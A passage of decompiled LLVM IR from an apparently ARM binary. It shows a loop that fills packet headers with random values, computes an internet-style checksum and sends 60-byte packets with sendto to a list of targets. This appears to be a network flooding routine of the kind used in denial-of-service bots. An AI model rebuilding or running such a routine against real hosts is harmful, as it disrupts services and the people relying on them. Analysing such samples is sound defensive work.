  store i1 %v7_dbb8, i1* %cpsr_z.global-to-local, align 1
  %v1_dbbc = add i32 %v7_dbb4, 20
  store i32 %v1_dbbc, i32* @r6, align 4
  %tmp86 = icmp ult i8 %v3_dbb0, 32
  br i1 %tmp86, label %dec_label_pc_dccc, label %dec_label_pc_dbc4

dec_label_pc_dbc4:                                ; preds = %dec_label_pc_dba4
  store i32 %v6_d85c, i32* %r0.global-to-local, align 4
  store i1 %v2_dbc8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_dbc8, label %dec_label_pc_dd34, label %dec_label_pc_dbd0

dec_label_pc_dbd0:                                ; preds = %dec_label_pc_dccc, %dec_label_pc_dbc4
  store i32 %v3_d8b0, i32* %r2.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.102 to i32), i32 -1), i32* @r4, align 4
  store i1 %v9_dd44, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_dd44, label %dec_label_pc_dd50, label %dec_label_pc_dbe4

dec_label_pc_dbe4:                                ; preds = %dec_label_pc_dd34.dec_label_pc_dbe4_crit_edge, %dec_label_pc_dbd0
  %v1_dbe8 = phi i32 [ %v1_dbe8.pre, %dec_label_pc_dd34.dec_label_pc_dbe4_crit_edge ], [ add (i32 ptrtoint (i32* @global_var_10000.102 to i32), i32 -1), %dec_label_pc_dbd0 ]
  store i32 %v3_d8cc, i32* %r3.global-to-local, align 4
  %v9_dbe8 = icmp eq i32 %v3_d8cc, %v1_dbe8
  store i1 %v9_dbe8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_dbe8, label %dec_label_pc_dd6c, label %dec_label_pc_dbf0

dec_label_pc_dbf0:                                ; preds = %dec_label_pc_dd50.dec_label_pc_dbf0_crit_edge, %dec_label_pc_dbe4
  %v1_dbf4 = phi i32 [ %v1_dbf4.pre, %dec_label_pc_dd50.dec_label_pc_dbf0_crit_edge ], [ %v1_dbe8, %dec_label_pc_dbe4 ]
  store i32 %v3_d8d0, i32* %ip.global-to-local, align 4
  %v9_dbf4 = icmp eq i32 %v3_d8d0, %v1_dbf4
  store i1 %v9_dbf4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_dbf4, label %dec_label_pc_dd88, label %dec_label_pc_dbfc

dec_label_pc_dbfc:                                ; preds = %dec_label_pc_dd6c.dec_label_pc_dbfc_crit_edge, %dec_label_pc_dbf0
  %v1_dc00 = phi i32 [ %v1_dc00.pre, %dec_label_pc_dd6c.dec_label_pc_dbfc_crit_edge ], [ %v1_dbf4, %dec_label_pc_dbf0 ]
  store i32 %v5_d798, i32* %r0.global-to-local, align 4
  %v9_dc00 = icmp eq i32 %v5_d798, %v1_dc00
  store i1 %v9_dc00, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_dc00, label %dec_label_pc_dda4, label %dec_label_pc_dc08

dec_label_pc_dc08:                                ; preds = %dec_label_pc_dd88.dec_label_pc_dc08_crit_edge, %dec_label_pc_dbfc
  %v1_dc0c = phi i32 [ %v1_dc0c.pre, %dec_label_pc_dd88.dec_label_pc_dc08_crit_edge ], [ %v1_dc00, %dec_label_pc_dbfc ]
  store i32 %v6_d7b0, i32* %r2.global-to-local, align 4
  %v9_dc0c = icmp eq i32 %v6_d7b0, %v1_dc0c
  store i1 %v9_dc0c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_dc0c, label %dec_label_pc_ddb8, label %dec_label_pc_dc14

dec_label_pc_dc14:                                ; preds = %dec_label_pc_dda4, %dec_label_pc_dc08
  store i32 %v1_d8d4, i32* %r3.global-to-local, align 4
  store i1 %v2_ddc0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ddc0, label %dec_label_pc_dc20, label %dec_label_pc_ddcc

dec_label_pc_dc20:                                ; preds = %dec_label_pc_dc14, %dec_label_pc_ddb8, %dec_label_pc_ddcc
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_dc24 = load i32, i32* %r7.global-to-local, align 4
  %v1_dc24 = trunc i32 %v0_dc24 to i8
  %v2_dc24 = load i32, i32* @r5, align 4
  %v3_dc24 = add i32 %v2_dc24, 10
  %v4_dc24 = inttoptr i32 %v3_dc24 to i8*
  store i8 %v1_dc24, i8* %v4_dc24, align 1
  %v0_dc28 = load i32, i32* %r7.global-to-local, align 4
  %v1_dc28 = trunc i32 %v0_dc28 to i8
  %v2_dc28 = load i32, i32* @r5, align 4
  %v3_dc28 = add i32 %v2_dc28, 11
  %v4_dc28 = inttoptr i32 %v3_dc28 to i8*
  store i8 %v1_dc28, i8* %v4_dc28, align 1
  %v0_dc2c = load i32, i32* @r5, align 4
  store i32 %v0_dc2c, i32* @r0, align 4
  %v2_dc30 = call i32 @function_ddf4(i32 %v0_dc2c, i32 20)
  %v3_dc30 = trunc i32 %v2_dc30 to i8
  %v4_dc3428 = udiv i32 %v2_dc30, 256
  %v1_dc38 = trunc i32 %v4_dc3428 to i8
  %v2_dc38 = load i32, i32* @r5, align 4
  %v3_dc38 = add i32 %v2_dc38, 11
  %v4_dc38 = inttoptr i32 %v3_dc38 to i8*
  store i8 %v1_dc38, i8* %v4_dc38, align 1
  %v3_dc3c = load i32, i32* @r5, align 4
  %v4_dc3c = add i32 %v3_dc3c, 10
  %v5_dc3c = inttoptr i32 %v4_dc3c to i8*
  store i8 %v3_dc30, i8* %v5_dc3c, align 1
  %v0_dc40 = load i32, i32* @r6, align 4
  store i32 %v0_dc40, i32* @r1, align 4
  store i32 10240, i32* %r2.global-to-local, align 4
  store i32 40, i32* %r3.global-to-local, align 4
  %v0_dc4c = load i32, i32* %r7.global-to-local, align 4
  %v1_dc4c = trunc i32 %v0_dc4c to i8
  %v3_dc4c = add i32 %v0_dc40, 16
  %v4_dc4c = inttoptr i32 %v3_dc4c to i8*
  store i8 %v1_dc4c, i8* %v4_dc4c, align 1
  %v0_dc50 = load i32, i32* %r7.global-to-local, align 4
  %v1_dc50 = trunc i32 %v0_dc50 to i8
  %v2_dc50 = load i32, i32* @r6, align 4
  %v3_dc50 = add i32 %v2_dc50, 17
  %v4_dc50 = inttoptr i32 %v3_dc50 to i8*
  store i8 %v1_dc50, i8* %v4_dc50, align 1
  %v0_dc54 = load i32, i32* @r5, align 4
  store i32 %v0_dc54, i32* %r0.global-to-local, align 4
  %v4_dc58 = call i32 @function_de50(i32 %v0_dc54, i32 %v0_dc40, i32 10240, i32 40)
  %v5_dc58 = trunc i32 %v4_dc58 to i8
  store i32 %v4_dc58, i32* %r0.global-to-local, align 4
  %v4_dc5c29 = udiv i32 %v4_dc58, 256
  %v1_dc60 = trunc i32 %v4_dc5c29 to i8
  %v2_dc60 = load i32, i32* @r6, align 4
  %v3_dc60 = add i32 %v2_dc60, 17
  %v4_dc60 = inttoptr i32 %v3_dc60 to i8*
  store i8 %v1_dc60, i8* %v4_dc60, align 1
  %v3_dc64 = load i32, i32* @r6, align 4
  %v4_dc64 = add i32 %v3_dc64, 16
  %v5_dc64 = inttoptr i32 %v4_dc64 to i8*
  store i8 %v5_dc58, i8* %v5_dc64, align 1
  %v3_dc68 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_dc68, i32* %r3.global-to-local, align 4
  %v0_dc6c = load i32, i32* @r5, align 4
  %v1_dc6c = add i32 %v0_dc6c, 20
  %v2_dc6c = inttoptr i32 %v1_dc6c to i32*
  %v3_dc6c = load i32, i32* %v2_dc6c, align 4
  %v3_dc74 = udiv i32 %v3_dc6c, 65536
  store i32 %v3_dc74, i32* %r2.global-to-local, align 4
  %v5_dc78 = mul i32 %v3_dc68, 24
  %v1_dc7c = load i32, i32* @r8, align 4
  %v2_dc7c = add i32 %v1_dc7c, %v5_dc78
  store i32 %v2_dc7c, i32* %ip.global-to-local, align 4
  %v3_dc8027 = udiv i32 %v3_dc6c, 16777216
  %v1_dc84 = trunc i32 %v3_dc8027 to i8
  %v3_dc84 = add i32 %v2_dc7c, 3
  %v4_dc84 = inttoptr i32 %v3_dc84 to i8*
  store i8 %v1_dc84, i8* %v4_dc84, align 1
  %v0_dc88 = load i32, i32* %r2.global-to-local, align 4
  %v1_dc88 = trunc i32 %v0_dc88 to i8
  %v2_dc88 = load i32, i32* %ip.global-to-local, align 4
  %v3_dc88 = add i32 %v2_dc88, 2
  %v4_dc88 = inttoptr i32 %v3_dc88 to i8*
  store i8 %v1_dc88, i8* %v4_dc88, align 1
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_dc90 = load i32, i32* @r5, align 4
  store i32 %v0_dc90, i32* %r1.global-to-local, align 4
  %v0_dc94 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_dc94, i32* %r0.global-to-local, align 4
  store i32 60, i32* %r2.global-to-local, align 4
  store i32 16, i32* %r4.global-to-local, align 4
  %v0_dca0 = load i32, i32* %ip.global-to-local, align 4
  %v4_dca0 = inttoptr i32 %v0_dca0 to %sockaddr*
  %v7_dca8 = inttoptr i32 %v0_dc90 to i32*
  %v9_dca8 = call i32 @sendto(i32 %v0_dc94, i32* %v7_dca8, i32 60, i32 16384, %sockaddr* %v4_dca0, i32 16)
  %v3_dcac = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_dcac, i32* %r3.global-to-local, align 4
  %v1_dcb0 = add i32 %v3_dcac, 1
  store i32 %v1_dcb0, i32* %r0.global-to-local, align 4
  %v1_dcb4 = load i32, i32* @sl, align 4
  %v9_dcb4 = icmp eq i32 %v1_dcb0, %v1_dcb4
  store i1 %v9_dcb4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_dcb0, i32* %stack_var_-40, align 4
  %v5_dcbc = icmp slt i32 %v1_dcb0, %v1_dcb4
  br i1 %v5_dcbc, label %dec_label_pc_dba4, label %dec_label_pc_dcc0

dec_label_pc_dcc0:                                ; preds = %dec_label_pc_dc20
  %v2_dcc0 = icmp eq i32 %v1_dcb4, 0
  store i1 %v2_dcc0, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_db94.outer

dec_label_pc_dccc:                                ; preds = %dec_label_pc_dba4
  %v1_dccc = add i32 %v2_dbac, 16
  %v2_dccc = inttoptr i32 %v1_dccc to i32*
  %v3_dccc = load i32, i32* %v2_dccc, align 4
  store i32 %v3_dccc, i32* %r4.global-to-local, align 4
  %v0_dcd0 = call i32 @function_f67c()
  store i32 %v0_dcd0, i32* %r0.global-to-local, align 4
  %v3_dcd4 = load i32, i32* %stack_var_-40, align 4
  %v5_dcdc = mul i32 %v3_dcd4, 24
  %v0_dce0 = load i32, i32* %r4.global-to-local, align 4
  %v1_dce4 = load i32, i32* @r8, align 4
  %v2_dce4 = add i32 %v1_dce4, %v5_dcdc
  store i32 %v2_dce4, i32* %r1.global-to-local, align 4
  %v1_dce8 = and i32 %v0_dce0, 65280
  store i32 %v1_dce8, i32* %r3.global-to-local, align 4
  %v1_dce0 = udiv i32 %v0_dce0, 256
  %v3_dcec = and i32 %v1_dce0, 65280
  store i32 %v3_dcec, i32* %r2.global-to-local, align 4
  %v3_dcf0 = mul i32 %v0_dce0, 16777216
  store i32 %v3_dcf0, i32* %ip.global-to-local, align 4
  %v1_dcf4 = add i32 %v2_dce4, 20
  %v2_dcf4 = inttoptr i32 %v1_dcf4 to i8*
  %v3_dcf4 = load i8, i8* %v2_dcf4, align 1
  %v4_dcf4 = zext i8 %v3_dcf4 to i32
  %v4_dcf8 = mul nuw nsw i32 %v1_dce8, 256
  %v5_dcf8 = or i32 %v4_dcf8, %v3_dcf0
  store i32 %v5_dcf8, i32* %ip.global-to-local, align 4
  %v2_dd00 = call i32 @llvm.bswap.i32(i32 %v0_dce0)
  %v7_dd04 = lshr i32 %v0_dcd0, %v4_dcf4
  %v8_dd04 = add i32 %v7_dd04, %v2_dd00
  store i32 %v8_dd04, i32* %r2.global-to-local, align 4
  %v3_dd10 = mul i32 %v8_dd04, 16777216
  %v1_dd08 = mul i32 %v8_dd04, 256
  %v4_dd14 = and i32 %v1_dd08, 16711680
  %v5_dd14 = or i32 %v4_dd14, %v3_dd10
  store i32 %v5_dd14, i32* %r1.global-to-local, align 4
  store i32 %v6_d85c, i32* %r0.global-to-local, align 4
  %v2_dd24 = call i32 @llvm.bswap.i32(i32 %v8_dd04)
  store i32 %v2_dd24, i32* %r3.global-to-local, align 4
  store i1 %v2_dbc8, i1* %cpsr_z.global-to-local, align 1
  %v1_dd2c = load i32, i32* @r5, align 4
  %v2_dd2c = add i32 %v1_dd2c, 16
  %v3_dd2c = inttoptr i32 %v2_dd2c to i32*
  store i32 %v2_dd24, i32* %v3_dd2c, align 4
  br i1 %v2_dbc8, label %dec_label_pc_dd34, label %dec_label_pc_dbd0

dec_label_pc_dd34:                                ; preds = %dec_label_pc_dccc, %dec_label_pc_dbc4
  %v0_dd34 = call i32 @function_f67c()
  store i32 %v0_dd34, i32* %r0.global-to-local, align 4
  store i32 %v3_d8b0, i32* %r2.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.102 to i32), i32 -1), i32* @r4, align 4
  store i1 %v9_dd44, i1* %cpsr_z.global-to-local, align 1
  %v1_dd48 = load i32, i32* @r5, align 4
  %v2_dd48 = add i32 %v1_dd48, 12
  %v3_dd48 = inttoptr i32 %v2_dd48 to i32*
  store i32 %v0_dd34, i32* %v3_dd48, align 4
  br i1 %v9_dd44, label %dec_label_pc_dd50, label %dec_label_pc_dd34.dec_label_pc_dbe4_crit_edge

dec_label_pc_dd34.dec_label_pc_dbe4_crit_edge:    ; preds = %dec_label_pc_dd34
  %v1_dbe8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_dbe4

dec_label_pc_dd50:                                ; preds = %dec_label_pc_dd34, %dec_label_pc_dbd0
  %v0_dd50 = call i32 @function_f67c()
  %v1_dd50 = trunc i32 %v0_dd50 to i8
  store i32 %v0_dd50, i32* %r0.global-to-local, align 4
  %v4_dd5430 = udiv i32 %v0_dd50, 256
  %v1_dd58 = trunc i32 %v4_dd5430 to i8
  %v2_dd58 = load i32, i32* @r5, align 4
  %v3_dd58 = add i32 %v2_dd58, 5
  %v4_dd58 = inttoptr i32 %v3_dd58 to i8*
  store i8 %v1_dd58, i8* %v4_dd58, align 1
  store i32 %v3_d8cc, i32* %r3.global-to-local, align 4
  %v1_dd60 = load i32, i32* @r4, align 4
  %v9_dd60 = icmp eq i32 %v3_d8cc, %v1_dd60
  store i1 %v9_dd60, i1* %cpsr_z.global-to-local, align 1
  %v3_dd64 = load i32, i32* @r5, align 4
  %v4_dd64 = add i32 %v3_dd64, 4
  %v5_dd64 = inttoptr i32 %v4_dd64 to i8*
  store i8 %v1_dd50, i8* %v5_dd64, align 1
  %v0_dd68 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_dd68, label %dec_label_pc_dd6c, label %dec_label_pc_dd50.dec_label_pc_dbf0_crit_edge

dec_label_pc_dd50.dec_label_pc_dbf0_crit_edge:    ; preds = %dec_label_pc_dd50
  %v1_dbf4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_dbf0

dec_label_pc_dd6c:                                ; preds = %dec_label_pc_dd50, %dec_label_pc_dbe4
  %v0_dd6c = call i32 @function_f67c()
  %v1_dd6c = trunc i32 %v0_dd6c to i8
  store i32 %v0_dd6c, i32* %r0.global-to-local, align 4
  store i32 %v3_d8d0, i32* %ip.global-to-local, align 4
  %v4_dd74 = sdiv i32 %v0_dd6c, 256
  store i32 %v4_dd74, i32* %r3.global-to-local, align 4
  %v1_dd78 = load i32, i32* @r4, align 4
  %v9_dd78 = icmp eq i32 %v3_d8d0, %v1_dd78
  store i1 %v9_dd78, i1* %cpsr_z.global-to-local, align 1
  %v3_dd7c = load i32, i32* @r5, align 4
  %v4_dd7c = add i32 %v3_dd7c, 20
  %v5_dd7c = inttoptr i32 %v4_dd7c to i8*
  store i8 %v1_dd6c, i8* %v5_dd7c, align 1
  %v0_dd80 = load i32, i32* %r3.global-to-local, align 4
  %v1_dd80 = trunc i32 %v0_dd80 to i8
  %v2_dd80 = load i32, i32* @r6, align 4
  %v3_dd80 = add i32 %v2_dd80, 1
  %v4_dd80 = inttoptr i32 %v3_dd80 to i8*
  store i8 %v1_dd80, i8* %v4_dd80, align 1
  %v0_dd84 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_dd84, label %dec_label_pc_dd88, label %dec_label_pc_dd6c.dec_label_pc_dbfc_crit_edge

dec_label_pc_dd6c.dec_label_pc_dbfc_crit_edge:    ; preds = %dec_label_pc_dd6c
  %v1_dc00.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_dbfc

dec_label_pc_dd88:                                ; preds = %dec_label_pc_dd6c, %dec_label_pc_dbf0
  %v0_dd88 = call i32 @function_f67c()
  %v1_dd88 = trunc i32 %v0_dd88 to i8
  %v4_dd8c = sdiv i32 %v0_dd88, 256
  store i32 %v4_dd8c, i32* %r3.global-to-local, align 4
  %v3_dd90 = load i32, i32* @r6, align 4
  %v4_dd90 = add i32 %v3_dd90, 2
  %v5_dd90 = inttoptr i32 %v4_dd90 to i8*
  store i8 %v1_dd88, i8* %v5_dd90, align 1
  store i32 %v5_d798, i32* %r0.global-to-local, align 4
  %v1_dd98 = load i32, i32* @r4, align 4
  %v9_dd98 = icmp eq i32 %v5_d798, %v1_dd98
  store i1 %v9_dd98, i1* %cpsr_z.global-to-local, align 1
  %v0_dd9c = load i32, i32* %r3.global-to-local, align 4
  %v1_dd9c = trunc i32 %v0_dd9c to i8
  %v2_dd9c = load i32, i32* @r6, align 4
  %v3_dd9c = add i32 %v2_dd9c, 3
  %v4_dd9c = inttoptr i32 %v3_dd9c to i8*
  store i8 %v1_dd9c, i8* %v4_dd9c, align 1
  %v0_dda0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_dda0, label %dec_label_pc_dda4, label %dec_label_pc_dd88.dec_label_pc_dc08_crit_edge

dec_label_pc_dd88.dec_label_pc_dc08_crit_edge:    ; preds = %dec_label_pc_dd88
  %v1_dc0c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_dc08

dec_label_pc_dda4:                                ; preds = %dec_label_pc_dd88, %dec_label_pc_dbfc
  %v0_dda4 = call i32 @function_f67c()
  store i32 %v0_dda4, i32* %r0.global-to-local, align 4
  store i32 %v6_d7b0, i32* %r2.global-to-local, align 4
  %v1_ddac = load i32, i32* @r4, align 4
  %v9_ddac = icmp eq i32 %v6_d7b0, %v1_ddac
  store i1 %v9_ddac, i1* %cpsr_z.global-to-local, align 1
  %v1_ddb0 = load i32, i32* @r6, align 4
  %v2_ddb0 = add i32 %v1_ddb0, 4
  %v3_ddb0 = inttoptr i32 %v2_ddb0 to i32*
  store i32 %v0_dda4, i32* %v3_ddb0, align 4
  br i1 %v9_ddac, label %dec_label_pc_ddb8, label %dec_label_pc_dc14

dec_label_pc_ddb8:                                ; preds = %dec_label_pc_dda4, %dec_label_pc_dc08
  %v0_ddb8 = call i32 @function_f67c()
  store i32 %v0_ddb8, i32* %r0.global-to-local, align 4
  store i32 %v1_d8d4, i32* %r3.global-to-local, align 4
  store i1 %v2_ddc0, i1* %cpsr_z.global-to-local, align 1
  %v1_ddc4 = load i32, i32* @r6, align 4
  %v2_ddc4 = add i32 %v1_ddc4, 8
  %v3_ddc4 = inttoptr i32 %v2_ddc4 to i32*
  store i32 %v0_ddb8, i32* %v3_ddc4, align 4
  br i1 %v2_ddc0, label %dec_label_pc_dc20, label %dec_label_pc_ddcc

dec_label_pc_ddcc:                                ; preds = %dec_label_pc_dc14, %dec_label_pc_ddb8
  %v0_ddcc = call i32 @function_f67c()
  %v1_ddcc = trunc i32 %v0_ddcc to i8
  store i32 %v0_ddcc, i32* %r0.global-to-local, align 4
  %v4_ddd0 = sdiv i32 %v0_ddcc, 256
  store i32 %v4_ddd0, i32* %r3.global-to-local, align 4
  %v1_ddd4 = trunc i32 %v4_ddd0 to i8
  %v2_ddd4 = load i32, i32* @r6, align 4
  %v3_ddd4 = add i32 %v2_ddd4, 19
  %v4_ddd4 = inttoptr i32 %v3_ddd4 to i8*
  store i8 %v1_ddd4, i8* %v4_ddd4, align 1
  %v3_ddd8 = load i32, i32* @r6, align 4
  %v4_ddd8 = add i32 %v3_ddd8, 18
  %v5_ddd8 = inttoptr i32 %v4_ddd8 to i8*
  store i8 %v1_ddcc, i8* %v5_ddd8, align 1
  br label %dec_label_pc_dc20

dec_label_pc_dde0:                                ; preds = %dec_label_pc_d880
  %v0_dde0 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_dde0, i32* %r0.global-to-local, align 4
  %v1_dde4 = call i32 @close(i32 %v0_dde0)
  store i32 %v1_dde4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_dde8

dec_label_pc_dde8:                                ; preds = %dec_label_pc_d6a8, %dec_label_pc_dde0
  %v29_ddec = phi i32 [ -1, %dec_label_pc_d6a8 ], [ %v1_dde4, %dec_label_pc_dde0 ]
  store i32 %v3_d6a8, i32* %r4.global-to-local, align 4
  store i32 %v6_d6a8, i32* %r5.global-to-local, align 4
  store i32 %v9_d6a8, i32* %r6.global-to-local, align 4
  store i32 %v12_d6a8, i32* %r7.global-to-local, align 4
  ret i32 %v29_ddec

; uselistorder directives
  uselistorder i32 %v4_ddd0, { 1, 0 }
  uselistorder i32 %v0_ddcc, { 0, 2, 1 }
  uselistorder i32 %v0_dd6c, { 0, 2, 1 }
  uselistorder i32 %v0_dd50, { 0, 2, 1 }
  uselistorder i32 %v2_dd24, { 1, 0 }
  uselistorder i32 %v8_dd04, { 2, 0, 1, 3 }
  uselistorder i32 %v3_dcf0, { 1, 0 }
  uselistorder i32 %v0_dce0, { 2, 0, 1, 3 }
  uselistorder i1 %v2_dcc0, { 1, 0 }
  uselistorder i32 %v1_dcb4, { 0, 2, 3, 1 }
  uselistorder i32 %v1_dcb0, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v4_dc58, { 0, 2, 1 }
  uselistorder i32 %v0_dc40, { 1, 0, 2 }
  uselistorder i1 %v2_dbc8, { 3, 0, 1, 2 }
  uselistorder i1 %v2_ddc0, { 2, 3, 1, 0 }
  uselistorder i1 %v9_dd44, { 2, 3, 1, 0 }
  uselistorder i32 %v1_db7c, { 1, 0, 2, 3 }
  uselistorder i8 %v5_d994, { 1, 0 }
  uselistorder i32 %v3_d97c, { 1, 0 }
  uselistorder i32 %v1_d978, { 1, 0 }
  uselistorder i32 %v1_d96c, { 1, 0 }
  uselistorder i32 %v1_d968, { 1, 0 }
  uselistorder i32 %v1_d944, { 1, 0 }
  uselistorder i32 %v1_d940, { 1, 0 }
  uselistorder i32 %v3_d934, { 1, 0 }
  uselistorder i32 %v1_d930, { 1, 0 }
  uselistorder i32 %v1_d90c, { 1, 0 }
  uselistorder i32 %v1_d904, { 1, 0 }
  uselistorder i32 %v1_d8d4, { 2, 1, 3, 0 }
  uselistorder i32 %v3_d8cc, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v0_d8c4, { 4, 0, 1, 3, 2 }
  uselistorder i32 %v0_d8c0, { 0, 2, 1, 4, 3 }
  uselistorder i32 %v3_d8b0, { 1, 2, 0 }
  uselistorder i32 %v6_d85c, { 5, 3, 4, 0, 2, 1 }
  uselistorder i32 %v6_d7b0, { 3, 2, 1, 0 }
  uselistorder i32 %v5_d798, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_d748, { 1, 0 }
  uselistorder i32 %v7_d704, { 0, 1, 3, 2 }
  uselistorder i32 %v5_d6e0, { 1, 0 }
  uselistorder i32 %v1_d6ac, { 2, 1, 0 }
  uselistorder i32* %stack_var_-40, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 0, 12, 11 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 31, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 32, 33, 34, 35 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 22, 21, 23, 24, 25, 26, 27, 28, 30, 29, 31, 32, 33, 35, 34, 37, 36, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 2, 4, 6, 7, 5, 8, 9, 11, 10, 13, 12, 14, 16, 15, 17, 18, 19, 22, 20, 21, 23, 24, 25, 26, 27, 1, 28, 29, 30, 31, 35, 32, 33, 34, 36, 38, 37, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 0 }
  uselistorder i32 41, { 2, 0, 1, 3, 4 }
  uselistorder i32 -8, { 0, 1, 2, 4, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_10000.102 to i32), { 1, 2, 3, 4, 0 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_10000.102 to i32), i32 -1), { 46, 0, 47, 45, 20, 48, 17, 49, 18, 50, 19, 51, 53, 1, 54, 52, 55, 56, 24, 57, 23, 58, 21, 59, 22, 60, 2, 3, 4, 62, 61, 25, 63, 26, 64, 5, 6, 7, 66, 65, 27, 67, 28, 68, 8, 69, 31, 70, 30, 71, 29, 72, 9, 11, 10, 33, 73, 32, 74, 75, 76, 12, 77, 78, 36, 79, 34, 80, 35, 81, 83, 13, 84, 82, 39, 85, 37, 86, 38, 87, 89, 14, 90, 88, 40, 91, 41, 92, 42, 93, 94, 15, 43, 95, 96, 16, 44, 97 }
  uselistorder label %dec_label_pc_dde8, { 1, 0 }
  uselistorder label %dec_label_pc_ddcc, { 1, 0 }
  uselistorder label %dec_label_pc_dc20, { 2, 1, 0 }
  uselistorder label %dec_label_pc_db94, { 1, 0 }
  uselistorder label %bb77, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_ddf4(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_ddf4:
  %tmp = or i32 %arg1, 1
  %tmp9 = icmp eq i32 %tmp, 1
  br i1 %tmp9, label %dec_label_pc_de24, label %dec_label_pc_de00

dec_label_pc_de00:                                ; preds = %dec_label_pc_ddf4
  %v0_de04.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_de04

dec_label_pc_de04:                                ; preds = %dec_label_pc_de04, %dec_label_pc_de00
  %v0_de18 = phi i32 [ %v2_de18, %dec_label_pc_de04 ], [ 0, %dec_label_pc_de00 ]
  %v0_de0c = phi i32 [ %v1_de0c, %dec_label_pc_de04 ], [ %arg1, %dec_label_pc_de00 ]
  %v0_de1c = phi i32 [ %v1_de1c, %dec_label_pc_de04 ], [ %v0_de04.pre, %dec_label_pc_de00 ]
  %v1_de04 = inttoptr i32 %v0_de1c to i8*
  %v2_de04 = load i8, i8* %v1_de04, align 1
  %v3_de04 = zext i8 %v2_de04 to i32
  %v1_de08 = add i32 %v0_de1c, 1
  %v2_de08 = inttoptr i32 %v1_de08 to i8*
  %v3_de08 = load i8, i8* %v2_de08, align 1
  %v4_de08 = zext i8 %v3_de08 to i32
  %v1_de0c = add i32 %v0_de0c, -2
  %v4_de10 = mul nuw nsw i32 %v4_de08, 256
  %v5_de10 = or i32 %v4_de10, %v3_de04
  %v2_de18 = add i32 %v5_de10, %v0_de18
  %v1_de1c = add i32 %v0_de1c, 2
  store i32 %v1_de1c, i32* @r0, align 4
  %v1_de0c.cmp = icmp ugt i32 %v1_de0c, 1
  br i1 %v1_de0c.cmp, label %dec_label_pc_de04, label %dec_label_pc_de24

dec_label_pc_de24:                                ; preds = %dec_label_pc_de04, %dec_label_pc_ddf4
  %v1_de2c = phi i32 [ 0, %dec_label_pc_ddf4 ], [ %v2_de18, %dec_label_pc_de04 ]
  %v0_de24 = phi i32 [ %arg1, %dec_label_pc_ddf4 ], [ %v1_de0c, %dec_label_pc_de04 ]
  %v7_de24 = icmp eq i32 %v0_de24, 1
  br i1 %v7_de24, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_de24
  %v1_de28 = load i32, i32* @r0, align 4
  %v2_de28 = inttoptr i32 %v1_de28 to i8*
  %v3_de28 = load i8, i8* %v2_de28, align 1
  %v4_de28 = zext i8 %v3_de28 to i32
  %v3_de2c = add i32 %v1_de2c, %v4_de28
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_de24, %bb
  %v0_de30 = phi i32 [ %v1_de2c, %dec_label_pc_de24 ], [ %v3_de2c, %bb ]
  %v3_de34 = urem i32 %v0_de30, 65536
  %v4_de38 = udiv i32 %v0_de30, 65536
  %v5_de38 = add nuw nsw i32 %v4_de38, %v3_de34
  %v4_de3c = udiv i32 %v5_de38, 65536
  %v5_de3c = add nuw nsw i32 %v4_de3c, %v5_de38
  %v1_de40 = urem i32 %v5_de3c, 65536
  %v3_de48 = xor i32 %v1_de40, 65535
  ret i32 %v3_de48

; uselistorder directives
  uselistorder i32 %v5_de38, { 1, 0 }
  uselistorder i32 %v1_de1c, { 1, 0 }
  uselistorder i32 %v1_de0c, { 1, 0, 2 }
